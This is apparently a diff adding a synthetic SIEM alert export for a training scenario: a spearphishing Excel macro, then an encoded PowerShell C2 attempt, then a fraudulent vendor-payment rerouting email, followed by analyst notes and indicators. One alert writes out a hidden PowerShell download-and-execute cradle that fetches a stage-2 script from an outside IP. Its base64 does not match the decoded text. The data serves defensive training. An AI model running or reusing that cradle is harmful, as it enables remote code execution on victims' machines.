@@ -1,0 +1,167 @@
+{
+  "scenario": "scenario-02-phishing-bec",
+  "description": "Simulated alert export — phishing email leading to Business Email Compromise attempt. PT Nusantara Digital lab environment. All data is synthetic.",
+  "alerts": [
+    {
+      "id": "wz-alert-20250121-011",
+      "timestamp": "2025-01-21T03:42:17.881Z",
+      "rule": {
+        "id": "31530",
+        "level": 7,
+        "description": "Suspicious email attachment opened — Office macro-enabled document",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique": "Phishing: Spearphishing Attachment",
+          "technique_id": "T1566.001"
+        }
+      },
+      "agent": {
+        "id": "ag-017",
+        "name": "WKSTN-FIN-017",
+        "ip": "10.10.5.17",
+        "department": "Finance",
+        "os": "Windows 11 Pro 23H2"
+      },
+      "user": {
+        "name": "siti.rahayu",
+        "domain": "NUSANTARA",
+        "email": "siti.rahayu@nusantaradigital.co.id",
+        "department": "Finance",
+        "title": "Senior Accounts Payable",
+        "privilege_level": "standard"
+      },
+      "email": {
+        "message_id": "<20250121-INV-8842@globallogistics-id.com>",
+        "from": "finance@globallogistics-id.com",
+        "from_display_name": "Finance Team - Global Logistics ID",
+        "to": "siti.rahayu@nusantaradigital.co.id",
+        "subject": "URGENT: Invoice #INV-8842 Payment Confirmation Required",
+        "received_at": "2025-01-21T03:38:04.000Z",
+        "attachment": {
+          "filename": "Invoice_INV-8842_Jan2025.xlsm",
+          "size_bytes": 187432,
+          "type": "application/vnd.ms-excel.sheet.macroEnabled.12",
+          "sha256": "a3f8c2d1e4b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1",
+          "virustotal_detections": 0,
+          "sandboxed": false
+        },
+        "spf_result": "pass",
+        "dkim_result": "pass",
+        "dmarc_result": "pass",
+        "sender_domain_age_days": 14,
+        "sender_domain_registered": "2025-01-07",
+        "legitimate_vendor": false,
+        "vendor_domain_spoofed": "globallogistics.co.id"
+      },
+      "event": {
+        "process": "EXCEL.EXE",
+        "action": "macro_execution_blocked",
+        "macro_content_hash": "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9",
+        "user_action": "clicked_enable_content"
+      },
+      "severity": "high",
+      "status": "open"
+    },
+    {
+      "id": "wz-alert-20250121-012",
+      "timestamp": "2025-01-21T03:47:33.554Z",
+      "rule": {
+        "id": "87110",
+        "level": 9,
+        "description": "PowerShell execution with encoded command — potential malware staging",
+        "mitre": {
+          "tactic": "Execution",
+          "technique": "Command and Scripting Interpreter: PowerShell",
+          "technique_id": "T1059.001"
+        }
+      },
+      "agent": {
+        "id": "ag-017",
+        "name": "WKSTN-FIN-017",
+        "ip": "10.10.5.17",
+        "department": "Finance",
+        "os": "Windows 11 Pro 23H2"
+      },
+      "user": {
+        "name": "siti.rahayu",
+        "domain": "NUSANTARA"
+      },
+      "event": {
+        "process": "powershell.exe",
+        "parent_process": "EXCEL.EXE",
+        "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ACIALAA0ADQANAA0ACkA",
+        "encoded_command_decoded": "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')",
+        "network_connection_attempted": {
+          "destination_ip": "185.220.101.47",
+          "destination_port": 4444,
+          "protocol": "TCP",
+          "blocked_by_firewall": true
+        }
+      },
+      "severity": "critical",
+      "status": "open"
+    },
+    {
+      "id": "wz-alert-20250121-013",
+      "timestamp": "2025-01-21T04:15:08.221Z",
+      "rule": {
+        "id": "31601",
+        "level": 11,
+        "description": "Suspicious outbound email — possible BEC wire transfer request",
+        "mitre": {
+          "tactic": "Collection",
+          "technique": "Email Collection",
+          "technique_id": "T1114"
+        }
+      },
+      "agent": {
+        "id": "mail-gateway-01",
+        "name": "MAIL-GW-01",
+        "ip": "10.10.1.5",
+        "role": "Email Gateway"
+      },
+      "user": {
+        "name": "siti.rahayu",
+        "domain": "NUSANTARA",
+        "email": "siti.rahayu@nusantaradigital.co.id"
+      },
+      "email": {
+        "from": "siti.rahayu@nusantaradigital.co.id",
+        "to": "treasury@nusantaradigital.co.id",
+        "cc": [],
+        "subject": "URGENT: Vendor payment rerouting — please process today",
+        "sent_at": "2025-01-21T04:14:52.000Z",
+        "body_excerpt": "Please update the bank account for our vendor PT Maju Bersama to the following new account effective immediately. The previous account is under audit and must not be used. New account: BCA 8877001234 a/n PT Maju Bersama Indonesia. Please process the pending invoice of IDR 487.500.000 today as the vendor has indicated urgency...",
+        "anomaly_flags": [
+          "sent_outside_business_hours",
+          "urgency_language_detected",
+          "bank_account_change_request",
+          "large_payment_amount",
+          "sent_27_minutes_after_phishing_alert"
+        ]
+      },
+      "severity": "critical",
+      "status": "open"
+    }
+  ],
+  "analyst_notes": {
+    "scenario_summary": "Classic BEC chain: spearphishing email with macro-enabled Excel attachment targeting AP staff → macro execution → encoded PowerShell attempting C2 beacon to same Tor IP as scenario-01 → 27 minutes later, suspicious outbound email requesting IDR 487.5M wire transfer reroute. C2 connection was blocked by firewall but BEC email was sent. Immediate containment needed.",
+    "suggested_pivot_points": [
+      "Check if treasury acted on the wire transfer email before detection",
+      "Review full email body and headers for siti.rahayu session",
+      "Check if other Finance staff received same phishing email",
+      "Verify globallogistics-id.com domain registration and hosting",
+      "Check WKSTN-FIN-017 for any additional process execution or persistence",
+      "Contact siti.rahayu directly — was she at her desk at 03:42 WIB?"
+    ],
+    "iocs": [
+      {"type": "domain", "value": "globallogistics-id.com", "note": "Phishing sender domain, 14 days old"},
+      {"type": "ip", "value": "185.220.101.47", "note": "C2 IP, Tor exit node, same as scenario-01"},
+      {"type": "sha256", "value": "a3f8c2d1e4b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1", "note": "Macro-enabled Excel attachment"},
+      {"type": "url", "value": "http://185.220.101.47/stage2.ps1", "note": "Stage 2 payload URL, blocked"}
+    ],
+    "mitre_chain": ["T1566.001", "T1059.001", "T1114"],
+    "kill_chain_phase": "Delivery → Exploitation → Actions on Objectives",
+    "threat_actor_note": "Overlap with scenario-01 C2 IP (185.220.101.47) suggests same threat actor or shared infrastructure. Possible coordinated campaign against Finance department."
+  }
+}
